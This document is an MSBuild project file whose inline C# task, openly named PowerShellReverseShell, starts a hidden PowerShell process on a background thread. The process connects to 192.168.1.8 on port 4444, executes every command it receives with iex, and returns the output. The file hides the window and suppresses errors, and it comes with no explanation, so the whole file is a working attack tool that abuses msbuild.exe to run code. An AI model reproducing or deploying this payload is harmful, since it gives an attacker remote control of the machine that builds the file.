<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Shell">
    <PowerShellReverseShell />
  </Target>
  
  <UsingTask TaskName="PowerShellReverseShell" TaskFactory="CodeTaskFactory" 
             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Diagnostics;
        using System.ComponentModel;
        using System.Threading;

        public class PowerShellReverseShell : Microsoft.Build.Utilities.Task {
            public override bool Execute() {
                // Run in background thread
                Thread thread = new Thread(new ThreadStart(RunReverseShell));
                thread.IsBackground = true;
                thread.Start();
                return true;
            }
            
            private void RunReverseShell() {
                try {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "powershell.exe";
                    psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.8',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
                    psi.CreateNoWindow = true;
                    psi.WindowStyle = ProcessWindowStyle.Hidden;
                    psi.UseShellExecute = false;
                    
                    Process.Start(psi);
                } catch {
                    // Silent failure
                }
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
